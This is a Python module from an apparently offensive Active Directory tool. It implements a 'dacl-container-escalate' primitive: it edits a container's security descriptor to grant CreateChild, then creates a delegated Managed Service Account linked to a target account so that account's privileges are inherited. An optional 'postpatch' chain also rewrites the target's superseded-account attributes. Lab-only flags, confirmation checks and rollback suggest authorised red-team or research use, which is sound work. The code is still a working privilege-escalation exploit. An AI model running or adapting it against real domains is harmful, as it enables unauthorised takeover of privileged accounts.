from __future__ import annotations

from typing import TYPE_CHECKING

from dmsa_reaper.ldap.dacl_editor import (
    add_aces_to_sd,
    build_allow_createchild_ace,
    read_sd,
    write_sd,
)
from dmsa_reaper.ldap.modify import add_object, modify_attribute
from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
from dmsa_reaper.ops.operation_log import new_operation, save_operation
from dmsa_reaper.ops.rollback import rollback_operation
from dmsa_reaper.ops.verify import verify_operation_ldap
from dmsa_reaper.primitives._ldap_helpers import (
    DMSA_MANAGED_PASSWORD_INTERVAL,
    DMSA_OBJECT_CLASSES,
    DMSA_STATE_COMPLETED,
    DMSA_UAC,
    dmsa_dn,
    generate_dmsa_name,
    read_attribute,
    resolve_meta,
)
from dmsa_reaper.primitives.base import Primitive, PrimitiveError
from dmsa_reaper.utils import guid_to_bytes_le

if TYPE_CHECKING:
    from ldap3 import Connection

    from dmsa_reaper.scope import Scope

_STATE_ACTIVE = 2

_POSTPATCH_REQUIRED = frozenset({
    "msDS-SupersededManagedAccountLink",
    "msDS-SupersededServiceAccountState",
})


class DaclContainerEscalatePrimitive(Primitive):
    """Grant self CreateChild:dMSA via container DACL modification, then run legacy or postpatch flow.

    Modes (set via metadata key 'chain', from --chain CLI flag):

      chain=legacy  (default)
        Phase 1: Read + log container nTSecurityDescriptor for rollback.
        Phase 2: Add CreateChild ACE (object-specific or broad).
        Phase 3: Create new dMSA with msDS-ManagedAccountPrecededByLink only.

      chain=postpatch
        Phases 1-3 same as legacy.
        Phase 4: Write msDS-SupersededManagedAccountLink and
                 msDS-SupersededServiceAccountState on the target.
        Pre-condition: target_writable_attrs (in metadata) must include both
        postpatch attrs; if absent, raises PrimitiveError before any LDAP write
        with the message "container DACL alone is not enough …".

    Rollback:
      reversed(changed_attrs): → restore postpatch attrs (postpatch only) → restore container DACL
      reversed(created_dns):   → delete dMSA
    """

    name = "dacl-container-escalate"

    def check(self, path: PathCandidate) -> bool:
        return path.primitive == self.name and path.requires_modify_container_dacl

    def plan(self, path: PathCandidate, *, scope_file_hash: str | None = None) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
            scope_file_hash=scope_file_hash,
        )

    def preflight(
        self,
        path: PathCandidate,
        *,
        scope: "Scope | None" = None,
        target_dn: str | None = None,
        container_dn: str | None = None,
    ) -> list[str]:
        warnings = super().preflight(path, scope=scope, target_dn=target_dn, container_dn=container_dn)
        if not (path.target_dn or target_dn):
            raise PrimitiveError(
                "dacl-container-escalate requires --target-dn "
                "(the account whose PAC should be inherited)."
            )
        return warnings

    def _planned_modified_dns(self, path: PathCandidate, *, target_dn: str | None = None) -> list[str]:
        dns = []
        if path.container_dn:
            dns.append(path.container_dn)
        effective_target = target_dn or path.target_dn
        if effective_target:
            dns.append(effective_target)
        return dns

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")

        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn")
        target_dn = resolve_meta(meta, "target_dn")
        principal_sid = resolve_meta(meta, "principal_sid")
        allow_broad = bool(meta.get("allow_broad_dacl"))
        chain = meta.get("chain", "legacy")

        if not meta.get("lab_unsafe"):
            raise PrimitiveError("dacl-container-escalate requires --lab-unsafe")
        if allow_broad and not meta.get("scope_allow_broad_dacl"):
            raise PrimitiveError(
                "broad DACL ACEs require allowBroadDacl=true in scope and --allow-broad-dacl"
            )
        if not container_dn:
            raise PrimitiveError("container_dn is required in operation metadata")
        if not target_dn:
            raise PrimitiveError("target_dn is required (pass --target-dn)")
        if not principal_sid:
            raise PrimitiveError(
                "principal_sid is required in operation metadata for DACL ACE construction"
            )

        # ── Postpatch pre-check (before any LDAP write) ────────────────────────
        if chain == "postpatch":
            writable = set(meta.get("target_writable_attrs") or [])
            if not _POSTPATCH_REQUIRED.issubset(writable) and not meta.get("allow_unmapped_target"):
                raise PrimitiveError(
                    "container DACL alone is not enough for postpatch mutual pairing; "
                    "target-side write is also required. "
                    "Ensure the operator has WriteProperty on "
                    "msDS-SupersededManagedAccountLink and "
                    "msDS-SupersededServiceAccountState on the target, "
                    "or use dacl-target-escalate instead."
                )

        # ── Resolve dMSA class GUID ────────────────────────────────────────────
        dmsa_class_guid_str: str | None = resolve_meta(meta, "dmsa_class_guid")
        object_type_bytes: bytes | None = None
        if dmsa_class_guid_str:
            object_type_bytes = guid_to_bytes_le(dmsa_class_guid_str)
        elif not allow_broad:
            raise PrimitiveError(
                "dMSA class GUID not available from schema cache. "
                "Pass --allow-broad-dacl to use a broad CreateChild ACE instead. "
                "This grants CreateChild for ALL object classes, not just dMSA."
            )

        # ── Phase 1: read and log original container SD ────────────────────────
        operation.status = "running"
        original_sd = read_sd(conn, container_dn)
        operation.changed_attrs.append(
            AttributeChange(
                dn=container_dn,
                attribute="nTSecurityDescriptor",
                before=[AttributeValue.security_descriptor(original_sd)],
                after=None,  # filled in after write
                mode="replace",
                step_name="dacl-mod",
                step_status="planned",
            )
        )
        save_operation(operation)

        # ── Phase 2: add CreateChild ACE to container ──────────────────────────
        try:
            new_ace = build_allow_createchild_ace(principal_sid, object_type_bytes)
            modified_sd = add_aces_to_sd(original_sd, [new_ace])
            write_sd(conn, container_dn, modified_sd)
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"dacl write {container_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            rollback_operation(operation, conn=conn)
            save_operation(operation)
            raise PrimitiveError(f"DACL modification failed: {exc}") from exc

        operation.changed_attrs[-1].after = [AttributeValue.security_descriptor(modified_sd)]
        operation.changed_attrs[-1].step_status = "written"
        save_operation(operation)

        # ── Phase 3: create dMSA in the container ─────────────────────────────
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"

        operation.maybe_created_dns.append(new_dn)
        operation.metadata["created_dmsa_dn"] = new_dn
        operation.metadata["created_dmsa_sam"] = sam
        save_operation(operation)

        try:
            add_object(
                conn,
                new_dn,
                DMSA_OBJECT_CLASSES,
                {
                    "sAMAccountName": sam,
                    "userAccountControl": DMSA_UAC,
                    "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
                    "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
                    "msDS-ManagedAccountPrecededByLink": target_dn,
                },
            )
        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"add_object {new_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            rollback_operation(operation, conn=conn)
            save_operation(operation)
            raise PrimitiveError(
                f"dMSA creation failed after DACL modification — DACL rolled back: {exc}"
            ) from exc

        if new_dn in operation.maybe_created_dns:
            operation.maybe_created_dns.remove(new_dn)
        operation.created_dns.append(new_dn)
        save_operation(operation)

        # ── Phase 4 (postpatch only): write target-side superseded attrs ───────
        if chain == "postpatch":
            try:
                before_link = read_attribute(conn, target_dn, "msDS-SupersededManagedAccountLink")
                link_change = AttributeChange(
                    dn=target_dn,
                    attribute="msDS-SupersededManagedAccountLink",
                    before=[AttributeValue.from_python(v) for v in before_link] if before_link else None,
                    after=[AttributeValue.from_python(new_dn)],
                    mode="replace",
                    step_name="postpatch-link",
                    step_status="planned",
                )
                operation.changed_attrs.append(link_change)
                save_operation(operation)
                modify_attribute(
                    conn, target_dn, "msDS-SupersededManagedAccountLink", [new_dn], mode="replace"
                )
                link_change.step_status = "written"
                save_operation(operation)

                before_state = read_attribute(conn, target_dn, "msDS-SupersededServiceAccountState")
                state_change = AttributeChange(
                    dn=target_dn,
                    attribute="msDS-SupersededServiceAccountState",
                    before=[AttributeValue.from_python(v) for v in before_state] if before_state else None,
                    after=[AttributeValue.from_python(_STATE_ACTIVE)],
                    mode="replace",
                    step_name="postpatch-state",
                    step_status="planned",
                )
                operation.changed_attrs.append(state_change)
                save_operation(operation)
                modify_attribute(
                    conn, target_dn, "msDS-SupersededServiceAccountState", [_STATE_ACTIVE], mode="replace"
                )
                state_change.step_status = "written"
                save_operation(operation)
            except Exception as exc:
                operation.status = "partial-failed"
                operation.errors.append(f"postpatch target write {target_dn}: {exc}")
                operation.metadata["execute_error"] = str(exc)
                save_operation(operation)
                rollback_operation(operation, conn=conn)
                save_operation(operation)
                raise PrimitiveError(
                    f"Postpatch target write failed — all writes rolled back: {exc}"
                ) from exc

        operation.status = "executed"
        save_operation(operation)
        return operation

    def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
        return verify_operation_ldap(operation, conn=conn)

    def rollback(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
        operation = rollback_operation(operation, conn=conn)
        save_operation(operation)
        return operation.status == "rolled-back"

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        principal_sid = resolve_meta(meta, "principal_sid") or "<principal_sid>"
        allow_broad = bool(meta.get("allow_broad_dacl"))
        chain = meta.get("chain", "legacy")
        dmsa_class_guid = resolve_meta(meta, "dmsa_class_guid") or "(not in schema cache)"
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"

        ace_desc = (
            f"object-specific CreateChild (ObjectType={dmsa_class_guid})"
            if not allow_broad
            else "broad CreateChild"
        )

        steps: list[str] = []
        if allow_broad:
            steps.append(
                "WARNING: broad ACE grants all child classes/all writable properties"
            )
        steps += [
            f"PHASE 1  READ    {container_dn}",
            "  attribute                               : nTSecurityDescriptor",
            "  (original SD recorded for rollback)",
            "",
            f"PHASE 2  MODIFY  {container_dn}",
            "  nTSecurityDescriptor                   : add ACE",
            f"  ACE type                               : {ace_desc}",
            f"  ACE principal                          : {principal_sid}",
            "",
            f"PHASE 3  CREATE  {new_dn}",
            f"  object classes                         : {', '.join(DMSA_OBJECT_CLASSES)}",
            f"  sAMAccountName                         : {sam}",
            f"  msDS-DelegatedMSAState                 : {DMSA_STATE_COMPLETED}  (migration-completed)",
            f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
        ]

        if chain == "postpatch":
            steps += [
                "",
                f"PHASE 4  MODIFY  {target_dn}",
                f"  msDS-SupersededManagedAccountLink      → {new_dn}",
                f"  msDS-SupersededServiceAccountState     → {_STATE_ACTIVE}",
                "  (chain=postpatch — target-side WriteProperty must already be present)",
            ]

        rollback_desc = "DELETE dMSA, restore container DACL"
        if chain == "postpatch":
            rollback_desc = "restore target attrs, DELETE dMSA, restore container DACL"
        steps += [
            "",
            f"ROLLBACK: {rollback_desc}",
            "  (CN above is an example — a new random suffix is generated at execute time)",
        ]
        return steps
